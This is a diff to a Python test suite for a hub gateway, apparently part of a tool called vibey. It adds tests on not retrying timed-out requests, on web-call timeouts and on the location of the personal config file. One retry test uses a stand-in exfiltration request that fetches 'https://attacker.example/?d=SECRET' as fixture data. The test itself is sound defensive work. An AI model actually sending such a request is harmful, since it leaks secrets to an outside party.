@@ -22,6 +22,7 @@ from vibey.domain.hub_scope import AGENT_DEFAULT_SCOPES, HubScope
 from vibey.infrastructure.hub.local_token import LocalTokenStore, ServingRecord
 from vibey.infrastructure.hub.settings import HubSettings
 from vibey.infrastructure.hub.tls import CERT_FILE
+from vibey.infrastructure.mcp import hub_gateway as hub_gateway_module
 from vibey.infrastructure.mcp.hub_gateway import (
     HUB_GATEWAY,
     HubGateway,
@@ -269,6 +270,9 @@ def test_gateway_error_paths(tmp_path: Path) -> None:
     with pytest.raises(HubGatewayError, match="the hub did not answer"):
         gw_still_down.call(HubCall(tool="vibey_projects", method="GET", route="/api/v1/projects"))
 
+
+_PERSONAL_CONFIG = hub_gateway_module.personal_config
+"""The real lookup, taken before the suite's hermetic fixture stands another in."""
 
 _DEFAULT_STUB_RESPONSE = HubGatewayResponse(200, '[{"id":"1"}]', True)
 
@@ -575,3 +579,104 @@ def test_a_record_naming_localhost_is_reached_at_a_fixed_loopback_literal(tmp_pa
     gw = HubGateway(config_path=lambda: toml, client=fake.factory, starter=lambda: False)
     gw.call(HubCall(tool="vibey_projects", method="GET", route="/api/v1/projects"))
     assert fake.calls[0]["base_url"] == "http://127.0.0.1:8765"
+
+
+class _TimedOut(_FakeHttpClient):
+    """The hub received the request and did not answer in time."""
+
+    def __init__(self, error: httpx.HTTPError) -> None:
+        super().__init__()
+        self.error = error
+
+    def request(
+        self, method: str, route: str, *, params: Any = None, json: Any = None
+    ) -> httpx.Response:
+        super().request(method, route, params=params, json=json)
+        raise self.error
+
+
+@pytest.mark.parametrize(
+    "error",
+    [
+        httpx.ReadTimeout("slow"),
+        httpx.WriteTimeout("slow"),
+        httpx.RemoteProtocolError("reset"),
+        httpx.ReadError("reset"),
+    ],
+)
+def test_a_request_that_may_have_reached_the_hub_is_never_sent_again(
+    tmp_path: Path, error: httpx.HTTPError
+) -> None:
+    """A fetch that timed out went out once and spent one unit of budget: sending it again would
+    leave the computer twice. Nor is the hub started over it (SP-ACP Task 9b)."""
+    state = tmp_path / "state"
+    toml = tmp_path / "vibey.toml"
+    toml.write_text(f"[hub]\nstate_dir = '{state}'\n")
+    LocalTokenStore(state).record_serving(ServingRecord(host="127.0.0.1", port=8765, pid=1))
+    fake = _TimedOut(error)
+    started: list[bool] = []
+    gw = HubGateway(
+        config_path=lambda: toml,
+        client=fake.factory,
+        starter=lambda: started.append(True) or True,
+        user_config=lambda: tmp_path / "none.toml",
+    )
+    call = HubCall(
+        tool="vibey_fetch",
+        method="POST",
+        route="/api/v1/web/fetch",
+        body={"url": "https://attacker.example/?d=SECRET"},
+        open_world=True,
+    )
+    with pytest.raises(HubGatewayError, match="not sent again"):
+        gw.call(call)
+    assert len(fake.calls) == 1 and started == []
+
+
+def test_a_web_call_waits_longer_than_the_hubs_own_web_deadline(tmp_path: Path) -> None:
+    state = tmp_path / "state"
+    toml = tmp_path / "vibey.toml"
+    toml.write_text(f"[hub]\nstate_dir = '{state}'\n")
+    mine = tmp_path / "me.toml"
+    mine.write_text("[web]\ntimeout_seconds = 90\n")
+    LocalTokenStore(state).record_serving(ServingRecord(host="127.0.0.1", port=8765, pid=1))
+    fake = _FakeHttpClient()
+    gw = HubGateway(
+        config_path=lambda: toml,
+        client=fake.factory,
+        starter=lambda: False,
+        user_config=lambda: mine,
+        environ=lambda: {"VIBEY_SEARCH_TIMEOUT": "10"},
+    )
+    web = HubCall(tool="vibey_fetch", method="POST", route="/api/v1/web/fetch", open_world=True)
+    plain = HubCall(tool="vibey_projects", method="GET", route="/api/v1/projects")
+    gw.call(web)
+    gw.call(plain)
+    assert [c["timeout"] for c in fake.calls] == [90.0 + 15.0, 15.0]
+    # Search's three backend timeouts decide when they are the longer.
+    slow = HubGateway(
+        config_path=lambda: toml,
+        client=fake.factory,
+        starter=lambda: False,
+        user_config=lambda: tmp_path / "none.toml",
+        environ=lambda: {"VIBEY_SEARCH_TIMEOUT": "20"},
+    )
+    slow.call(web)
+    assert fake.calls[-1]["timeout"] == 3 * 20.0 + 15.0
+    # A [web] or search setting that cannot be read leaves the defaults, never a failure.
+    mine.write_text("[web]\ntimeout_seconds = 'x'\n")
+    broken = HubGateway(
+        config_path=lambda: toml,
+        client=fake.factory,
+        starter=lambda: False,
+        user_config=lambda: mine,
+        environ=lambda: {"VIBEY_SEARCH_PROVIDER": "brave"},
+    )
+    broken.call(web)
+    assert fake.calls[-1]["timeout"] == 3 * 15.0 + 15.0
+
+
+def test_the_persons_own_vibey_toml_is_the_one_in_their_configuration_folder() -> None:
+    from vibey.infrastructure.user_config_folder import UserConfigFolder
+
+    assert _PERSONAL_CONFIG() == UserConfigFolder().path() / "vibey.toml"
